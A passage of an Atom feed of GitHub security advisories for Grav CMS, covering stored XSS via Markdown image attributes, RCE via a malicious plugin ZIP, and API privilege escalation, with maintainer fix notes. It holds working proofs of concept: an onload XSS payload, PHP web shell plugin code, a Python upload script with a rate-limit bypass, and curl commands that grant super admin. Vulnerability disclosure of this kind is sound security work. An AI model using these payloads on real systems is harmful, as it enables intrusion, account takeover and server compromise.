-<p>The Admin Plugin's save-time XSS detection does not appear to block this because the stored content is Markdown media syntax, not raw HTML:</p>
-<pre><code class="language-markdown">![Quarterly market overview](market-overview.gif?attribute=onload,alert(document.domain))
-</code></pre>
-<p>The dangerous HTML is generated later during Markdown/media rendering.</p>
-<h3 id="poc">PoC</h3>
-<p>I reproduced this on a standard Grav CMS installation with the Admin Plugin enabled.</p>
-<p>Configuration and prerequisites:</p>
-<ul>
-<li>Grav CMS 1.7.49.5</li>
-<li>Admin Plugin 1.10.49.1</li>
-<li>Markdown processing enabled for pages</li>
-<li>A user account with permission to create or edit pages</li>
-<li>A page media file available in the edited page folder, for example <code>market-overview.gif</code></li>
-</ul>
-<p>Steps to reproduce:</p>
-<ol>
-<li><p>Install Grav CMS with the Admin Plugin.</p>
-</li>
-<li><p>Log in to the Admin panel as a user who can create or edit pages.</p>
-</li>
-<li><p>Create a normal content page or edit an existing one.</p>
-</li>
-<li><p>Add or reference a page media file named <code>market-overview.gif</code>.</p>
-</li>
-<li><p>Insert the following Markdown into the page body:</p>
-<pre><code class="language-markdown">![Quarterly market overview](market-overview.gif?attribute=onload,alert(document.domain))
-</code></pre>
-</li>
-<li><p>Save the page.</p>
-</li>
-<li><p>Open the rendered frontend page in a browser.</p>
-</li>
-<li><p>The JavaScript payload executes when the image loads.</p>
-</li>
-<li><p>Inspect the generated DOM. The rendered image element contains the injected <code>onload</code> attribute.</p>
-</li>
-</ol>
-<p>Expected result:</p>
-<p>The Markdown media action should not be able to generate executable HTML attributes. The payload should be rejected, sanitized, or rendered without the dangerous event-handler attribute.</p>
-<p>Actual result:</p>
-<p>The payload is accepted and rendered as an executable image event handler:</p>
-<pre><code class="language-html">&lt;img onload="alert(document.domain)" alt="Quarterly market overview" src="/user/pages/03.campaigns/market-overview.gif?..."&gt;
-</code></pre>
-<p>Screenshots:</p>
-<ul>
-<li>the stored Markdown payload in the page editor<img src="https://github.com/user-attachments/assets/8f5e5275-e4ef-4d5e-a2cd-44683537b909" alt="edycja" height="1013" width="1718"></li>
-<li>the JavaScript alert executing on the frontend page<img src="https://github.com/user-attachments/assets/6de81228-830c-49f2-ac41-b15658a8913d" alt="alert" height="1002" width="1727"></li>
-<li>browser DevTools showing the injected <code>onload</code> attribute in the rendered DOM<img src="https://github.com/user-attachments/assets/7832c42d-6f3a-4ea2-b072-b837bd3913ed" alt="inspect" height="539" width="939"></li>
-</ul>
-<h3 id="impact">Impact</h3>
-<p>This is a stored cross-site scripting vulnerability.</p>
-<p>An authenticated user with page editing permissions can store a malicious Markdown image reference. When the affected page is rendered, the payload executes in the browser of any user who views that page.</p>
-<p>In multi-user Grav installations, this may allow a lower-privileged editor to target administrators, reviewers, or other privileged users who preview or view editor-controlled content. Depending on the victim's privileges and deployed plugins, successful exploitation may allow JavaScript execution in the site origin, access to same-origin page data available to the victim, and same-origin actions performed as the victim.</p>
-<p>CVSS 4.0 rationale:</p>
-<ul>
-<li><code>AV:N</code>: the issue is exploitable through the web application.</li>
-<li><code>AC:L</code>: no special race condition or complex setup is required after page editing access is obtained.</li>
-<li><code>AT:P</code>: exploitation requires the malicious Markdown/media reference to be stored in page content and later rendered to a victim.</li>
-<li><code>PR:H</code>: the attacker needs page editing capability.</li>
-<li><code>UI:P</code>: a victim must view the affected page. The demonstrated <code>onload</code> payload executes on passive page rendering, without requiring a click or form submission by the victim.</li>
-<li><code>VC:H/VI:L/VA:N</code>: confidentiality impact can be high when the victim is an administrator or reviewer; integrity impact is limited; no direct availability impact was demonstrated.</li>
-<li><code>SC:H/SI:L/SA:N</code>: the injected script executes in the browser/application context and may affect subsequent same-origin interactions available to the victim.</li>
-</ul>
-<h2 id="maintainer-note--fix-applied-2026-04-24">Maintainer note — fix applied (2026-04-24)</h2>
-<p>Fixed in Grav core on the <code>2.0</code> branch: commit <a href="https://github.com/getgrav/grav/commit/5a12f9be8"><code>5a12f9be8</code></a> — will ship in <strong>2.0.0-beta.2</strong>.</p>
-<p><strong>What changed:</strong> <code>MediaObjectTrait::attribute()</code> — the sink reached by Markdown like <code>![alt](img.gif?attribute=onload,alert(1))</code> — now gates the attribute <strong>name</strong> through an allowlist regex (<code>^[A-Za-z][A-Za-z0-9_:.\-]*$</code>) plus an explicit denylist of script-context names:</p>
-<ul>
-<li>any <code>on*</code> handler (case-insensitive)</li>
-<li><code>style</code> (inline CSS expression risk)</li>
-<li><code>xmlns</code> (XML namespace tricks)</li>
-<li><code>srcdoc</code> (iframe sandbox bypass)</li>
-<li><code>formaction</code> (form action override)</li>
-</ul>
-<p>Invalid names are silently dropped — the attribute isn't stored, so it doesn't survive into the rendered <code>&lt;img&gt;</code>. <code>src</code>/<code>href</code>/<code>data-*</code>/<code>aria-*</code>/standard media attributes are unaffected.</p>
-<p><strong>Files:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Media/Traits/MediaObjectTrait.php"><code>system/src/Grav/Common/Media/Traits/MediaObjectTrait.php</code></a> — new <code>isSafeAttributeName()</code> gate.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/MediaAttributeSecurityTest.php"><code>tests/unit/Grav/Common/Security/MediaAttributeSecurityTest.php</code></a> — 28 cases (14 dangerous-name rejections, 14 safe-name round-trips).</li>
-</ul>
-<h3 id="discoverers">Discoverers</h3>
-<p>@K-Czaplicki
-@morzelowski</p>
-<hr>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-r7fx-8g49-7hhr">https://github.com/getgrav/grav/security/advisories/GHSA-r7fx-8g49-7hhr</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663">https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663</a></li>
-<li><a href="https://github.com/advisories/GHSA-r7fx-8g49-7hhr">https://github.com/advisories/GHSA-r7fx-8g49-7hhr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r7fx-8g49-7hhr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-05T21:24:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav Vulnerable to Remote Code Execution (RCE) via Malicious Plugin ZIP Upload in Direct Install Feature]]></title>
-        <id>https://github.com/advisories/GHSA-w48r-jppp-rcfw</id>
-        <link href="https://github.com/advisories/GHSA-w48r-jppp-rcfw"/>
-        <updated>2026-05-05T21:21:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>An authenticated user with administrative privileges can achieve Remote Code Execution (RCE) by uploading a specially crafted ZIP file through the "Direct Install" tool. While the system attempts to block direct .php file uploads, it fails to inspect the contents of uploaded ZIP archives. Once a malicious plugin is extracted, it can execute arbitrary PHP code or drop a persistent web shell on the server.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerability exists in the handling of the directInstall task within the Admin plugin and the Grav Package Manager (GPM) core.</p>
-<ul>
-<li>Vulnerable Endpoints: /admin/tools/direct-install</li>
-<li>Vulnerable Logic: AdminController.php (lines 1247-1295) and Gpm.php (lines 214-285).</li>
-<li>Root Cause: The function Installer::install() (called in Gpm.php:291) extracts the contents of the ZIP file directly into the /user/</li>
-</ul>
-<p>plugins/ or /user/themes/ directories without validating the file extensions or the content of the files inside the archive.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Prepare the Malicious Plugin</li>
-</ol>
-<p>Create a directory named shellplugin and add the following files:</p>
-<p>shellplugin.php:</p>
-<pre><code>
-&lt;?php
-namespace Grav\Plugin;
-use Grav\Common\Plugin;
-
-class ShellpluginPlugin extends Plugin {
-    public static function getSubscribedEvents(): array {
-        return ['onPluginsInitialized' =&gt; ['onPluginsInitialized', 0]];
-    }
-    public function onPluginsInitialized(): void {
-        $shell_path = GRAV_ROOT . '/shell.php';
-        if (!file_exists($shell_path)) {
-            file_put_contents($shell_path, '&lt;?php system($_GET["cmd"]); ?&gt;');
-        }
-    }
-}
-</code></pre>
-<p>(Also include a basic blueprints.yaml and shellplugin.yaml as per Grav standards).</p>
-<ol start="2">
-<li>Create the ZIP Archive</li>
-</ol>
-<pre><code>`zip -r /tmp/shellplugin.zip shellplugin/`
-
-3. Execute the Exploit Script
-Run the following Python script to automate the login, nonce retrieval, and malicious upload process:
-
-`import requests, re, json
-
-
-s = requests.Session()
-BASE_URL = 'http://127.0.0.1'
-</code></pre>
-<h4 id="1-login-and-bypass-rate-limit-via-x-forwarded-for">1. Login and Bypass Rate Limit via X-Forwarded-For</h4>
-<pre><code>r = s.get(f'{BASE_URL}/admin')
-nonce = re.search(r'name="login-nonce" value="([^"]+)"', r.text).group(1)
-
-r2 = s.post(f'{BASE_URL}/admin',
-    headers={'X-Forwarded-For': '10.0.0.3'},
-    data={'data[username]': 'admin', 'data[password]': 'admin_password_here', 'task': 'login', 'login-nonce': nonce},
-    allow_redirects=False)
-
-redirect = json.loads(r2.text)['redirect']
-s.get(redirect)
-print(f"[+] Logged in successfully.")
-</code></pre>
-<h4 id="2-extract-admin-nonce-from-tools-page">2. Extract Admin Nonce from Tools Page</h4>
-<pre><code>tools = s.get(f'{BASE_URL}/admin/tools/direct-install')
-admin_nonce = re.search(r'admin-nonce.*?value="([a-f0-9]{32})"', tools.text).group(1)
-print(f"[+] Retrieved Admin Nonce: {admin_nonce}")
-</code></pre>
-<h4 id="3-upload-and-execute">3. Upload and Execute</h4>
-<pre><code>with open('/tmp/shellplugin.zip', 'rb') as f:
-    zip_data = f.read()
-
-resp = s.post(f'{BASE_URL}/admin/tools/direct-install',
-    data={'task': 'directInstall', 'admin-nonce': admin_nonce},
-    files={'uploaded_file': ('shellplugin.zip', zip_data, 'application/zip')},
-    headers={'X-Forwarded-For': '10.0.0.3'}
-)
-
-if "installation" in resp.text.lower():
-    print("[+] Plugin installed successfully!")
-    # Trigger the shell
-    s.get(BASE_URL) 
-    print(f"[+] RCE Check: {BASE_URL}/shell.php?cmd=id")`
-</code></pre>
-<h4 id="4-verification">4. Verification</h4>
-<p>Access the dropped shell to confirm command execution:
-<code>curl -s "http://127.0.0.1/shell.php?cmd=whoami"</code></p>
-<img src="https://github.com/user-attachments/assets/6a8c25f1-9a9d-469f-ab68-3c7007e446d4" alt="resim (2)" height="756" width="2547">
-
-<img src="https://github.com/user-attachments/assets/ec097785-1196-47a4-b24e-82fcbf0f7520" alt="resim (3)" height="89" width="898">
-
-
-<h3 id="impact">Impact</h3>
-<ul>
-<li>Vulnerability Type: Remote Code Execution (RCE) / Path Traversal (via extraction).</li>
-<li>Who is impacted: Any Grav installation where the Admin plugin is enabled and an attacker has gained administrative access (or an administrator is tricked into uploading a malicious ZIP).</li>
-<li>Severity: Critical. Although it requires admin privileges, the ability to gain full server control (system-level access) makes this a high-impact finding, especially in multi-user environments or via CSRF/Session hijacking.</li>
-</ul>
-<h2 id="maintainer-note--partial-fix-applied-2026-04-24">Maintainer note — partial fix applied (2026-04-24)</h2>
-<p>Fixed in Grav core on the <code>2.0</code> branch: commit <a href="https://github.com/getgrav/grav/commit/5a12f9be8"><code>5a12f9be8</code></a> — ships in <strong>2.0.0-beta.2</strong>.</p>
-<p><strong>What changed (path layer):</strong> <code>Installer::unZip</code> now pre-validates every entry name before calling <code>ZipArchive::extractTo</code>, and aborts the install if any entry looks like a Zip Slip primitive — <code>..</code> path segments, absolute paths (Unix <code>/…</code> or Windows <code>C:\…</code>/<code>\…</code>), or NUL bytes. A crafted ZIP can no longer write files outside the target <code>user/plugins/&lt;slug&gt;</code> or <code>user/themes/&lt;slug&gt;</code> directory.</p>
-<p><strong>Explicit scope limitation:</strong> the "well-formed but malicious plugin code" angle of the PoC — uploading a plugin whose own PHP is the payload — is <strong>not</strong> addressed by this change. <code>directInstall</code> is an administrator-only operation whose explicit purpose is to install arbitrary PHP; defending against it would require a plugin-signing or marketplace-allowlist feature, which is a separate roadmap item. Administrators should only install plugins from trusted sources. This is now explicitly documented in the commit note.</p>
-<p><strong>Files:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/GPM/Installer.php"><code>system/src/Grav/Common/GPM/Installer.php</code></a> — new <code>isSafeArchiveEntry()</code> helper + pre-extract validation loop.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/ZipSlipSecurityTest.php"><code>tests/unit/Grav/Common/Security/ZipSlipSecurityTest.php</code></a> — 21 cases covering Unix/Windows/URL-encoded traversal primitives and legitimate plugin names.</li>
-</ul>
-<hr>
-<h3 id="acknowledgements">Acknowledgements</h3>
-<p>The issue was identified by Security Researcher <strong>Mustafa Murat Akgül</strong>.</p>
-<hr>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-w48r-jppp-rcfw">https://github.com/getgrav/grav/security/advisories/GHSA-w48r-jppp-rcfw</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663">https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663</a></li>
-<li><a href="https://github.com/advisories/GHSA-w48r-jppp-rcfw">https://github.com/advisories/GHSA-w48r-jppp-rcfw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w48r-jppp-rcfw</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-05T21:21:10.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav-plugin-api] Grav API Privilege Escalation to Super Admin]]></title>
-        <id>https://github.com/advisories/GHSA-r945-h4vm-h736</id>
-        <link href="https://github.com/advisories/GHSA-r945-h4vm-h736"/>
-        <updated>2026-05-05T21:20:03.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>An insecure direct object reference and logic flaw in the Grav API plugin (<code>UsersController::update</code>) allows any authenticated user with basic API access (<code>api.access</code>) to modify their own permission configuration. An attacker can exploit this to escalate their privileges to Super Administrator (<code>admin.super</code> and <code>api.super</code>), leading to full system compromise and potential RCE.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerability is located in <code>user/plugins/api/classes/Api/Controllers/UsersController.php</code> within the <code>update</code> method.</p>
-<p>The API allows users to update their own profiles if they possess the basic <code>api.access</code> permission:</p>
-<pre><code class="language-php">// UsersController.php -&gt; update()
-$isSelf = $currentUser-&gt;username === $username;
-if (!$isSelf) {
-    $this-&gt;requirePermission($request, 'api.users.write');
-} else {
-    // Self-edit only requires api.access
-    $this-&gt;requirePermission($request, 'api.access');
-}
-</code></pre>
-<p>However, when filtering the fields that are allowed to be updated via a <code>PATCH</code> request, the <code>access</code> field (which defines the user's role and permissions) is indiscriminately included in the <code>$allowedFields</code> whitelist for all users:</p>
-<pre><code class="language-php">// Partial update - only update provided fields
-$allowedFields = ['email', 'fullname', 'title', 'state', 'language', 'content_editor', 'access', 'twofa_enabled'];
-foreach ($allowedFields as $field) {
-    if (array_key_exists($field, $body)) {
-        $user-&gt;set($field, $body[$field]);
-    }
-}
-</code></pre>
-<p>Because there is no secondary check to verify if the user attempting to modify the <code>access</code> field is already an administrator, any low-privileged user can overwrite their own <code>access</code> object with a malicious payload granting themselves <code>super: true</code>.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li><p><strong>Prerequisites</strong>: You need a low-privileged user account (eg. <code>user1</code>) that possesses the basic <code>api.access</code> permission.</p>
-</li>
-<li><p><strong>Obtain JWT</strong>: Authenticate to the API to obtain your <code>access_token</code>:</p>
-<pre><code class="language-bash">curl -X POST http://&lt;target&gt;/api/v1/auth/token \
-  -H "Content-Type: application/json" \
-  -d '{"username":"user1","password":"your_password"}'
-</code></pre>
-</li>
-<li><p><strong>Exploit</strong>: Send a <code>PATCH</code> request to the user update endpoint. </p>
-<pre><code class="language-bash">curl -X PATCH http://&lt;target&gt;/api/v1/users/user1 \
-  -H "X-API-Token: &lt;your_access_token&gt;" \
-  -H "Content-Type: application/json" \
-  -d "{\"access\":{\"admin\":{\"login\":true,\"super\":true},\"api\":{\"access\":true,\"super\":true},\"site\":{\"login\":true}}}"
-</code></pre>
-</li>
-<li><p><strong>Verification</strong>: Log in to the Grav Admin panel using the user credentials. You will now have full Super Administrator privileges.</p>
-</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>This is a vertical Privilege Escalation vulnerability. Any user with baseline API access can elevate themselves to Super Admin. Once Super Admin privileges are obtained, the attacker takes complete control over the CMS. They can modify content, alter configurations, upload malicious plugins, or edit Twig templates outside of the sandbox to achieve RCE on the server.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-r945-h4vm-h736">https://github.com/getgrav/grav/security/advisories/GHSA-r945-h4vm-h736</a></li>
-<li><a href="https://github.com/getgrav/grav-plugin-api/commit/26f529c7d438c73343e82311fb095caeaf1a6116">https://github.com/getgrav/grav-plugin-api/commit/26f529c7d438c73343e82311fb095caeaf1a6116</a></li>
-<li><a href="https://github.com/advisories/GHSA-r945-h4vm-h736">https://github.com/advisories/GHSA-r945-h4vm-h736</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r945-h4vm-h736</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T21:20:03.000Z</published>
     </entry>
 </feed>
